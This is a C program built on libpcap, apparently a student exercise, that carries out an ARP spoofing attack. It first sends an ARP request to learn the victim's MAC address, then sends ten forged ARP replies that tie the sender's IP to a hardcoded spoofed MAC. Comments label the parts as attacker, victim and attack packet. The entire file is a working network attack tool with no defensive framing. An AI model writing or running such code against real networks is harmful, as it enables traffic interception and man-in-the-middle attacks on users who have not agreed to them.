#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <stdint.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#define ETHERNET_SIZE 14
struct ETHERNET_HEADER{
    u_int8_t Destination_Mac[6];
    u_int8_t Source_Mac[6];
    u_int16_t Ether_Type;
};

struct ARP_HEADER{

    u_int16_t Mac_Type;
    u_int16_t IP_Type;
    u_int8_t Mac_Add_Len;
    u_int8_t IP_Add_Len;
    u_int16_t Opcode;
    u_int8_t Sender_Mac[6];
    struct in_addr Sender_IP;
    u_int8_t Target_Mac[6];
    struct in_addr Target_IP;
};
int main(int argc, char* argv[])
{

    char errbuf[PCAP_ERRBUF_SIZE];
    struct ETHERNET_HEADER *ethernet;
    struct ARP_HEADER *arp;
    u_int32_t sender;
    u_int32_t target;
    int i = 0;
    int res;
    struct pcap_pkthdr *header;

    const u_char* rev_packet;
    pcap_t *handle;
    u_char packet[42];


    if(argc == 1 || argc >4 ){
        printf("%s [Interface] [Sender IP] [Victim IP]\n",argv[0]);
        exit(1);
    }

    printf("%s\n", argv[2]);
    printf("%s\n", argv[3]);
    sender = inet_addr(argv[2]);
    target = inet_addr(argv[3]);
    ethernet = (struct ETHERNET_HEADER*)malloc(sizeof(struct ETHERNET_HEADER));
    arp = (struct ARP_HEADER *)malloc(sizeof(struct ARP_HEADER));
    handle = pcap_open_live(argv[1], BUFSIZ, 0, -1, errbuf);

    //////////////////////////////////////////////
    //////Making Packet to know Victim's MAC//////
    //////////////////////////////////////////////

    for (i = 0; i < 6; i++) {
        packet[i] = 0xff;
    }
    packet[6] = 0x00;
    packet[7] = 0x0c;
    packet[8] = 0x29;
    packet[9] = 0xac;
    packet[10] = 0x4c;
    packet[11] = 0xee;
    packet[12] = 0x08;
    packet[13] = 0x06;

    packet[14] = 0x00;
    packet[15] = 0x01;
    packet[16] = 0x08;
    packet[17] = 0x00;

    packet[18] = 0x06;
    packet[19]= 0x04;
    packet[20] = 0x00;
    packet[21] = 0x01;
    ///////////////////////////////////////
    ////////Attacker Mac and IP////////////
    ///////////////////////////////////////
    packet[22] = 0x00;
    packet[23] = 0x0c;
    packet[24] = 0x29;
    packet[25] = 0xac;
    packet[26] = 0x4d;
    packet[27] = 0xee;

    for(i=0; i<4; i++){
        packet[28+i] = sender >> i*8;
        printf("%x\n", packet[28+i]);
    }
    ////////////////////////////////////////
    //////////Victim Mac and IP/////////////
    ////////////////////////////////////////
    packet[32] = 0x00;
    packet[33] = 0x00;
    packet[34] = 0x00;
    packet[35] = 0x00;
    packet[36] = 0x00;
    packet[37] = 0x00;
    for(i=0;i<4; i++){
        packet[38+i] = target >> i*8;
        printf("%x\n", packet[38+i]);
    }




    ///////////////////////////////////////////////////////
    //////////////////Catch Packet/////////////////////////
    ///////////////////////////////////////////////////////

    while(1){
        pcap_sendpacket(handle, packet,42);
        res=pcap_next_ex(handle, &header, &rev_packet);

        if(res == 0){
            continue;
        }
        else if(res == -1 || res == -2){
            printf("res = -1 or -2 \n");
            break;
        }else{
            ethernet = (struct ETHERNET_HEADER *)(rev_packet);
            arp = (struct ARP_HEADER *)(rev_packet+ETHERNET_SIZE);
            printf("%d\n", arp->Opcode);
            if(arp->Opcode == 512){
                printf("Found..!!\n");
                break;
            }


        }

    }



    ////////////////////////////////////////////////////////////
    /////////////////////Sending Attack Packet//////////////////
    ////////////////////////////////////////////////////////////

    for(i=0; i<6; i++){
        packet[i] = ethernet->Source_Mac[i];
        packet[32+i] = ethernet->Source_Mac[i];
    }



    packet[22] = 0x00;
    packet[23] = 0x50;
    packet[24] = 0x56;
    packet[25] = 0xf6;
    packet[26] = 0x51;
    packet[27] = 0x61;
    for(i=0; i<10; i++){
        pcap_sendpacket(handle, packet,42);
    }
    printf("Attack Finished..!\n");

    return 0;
}

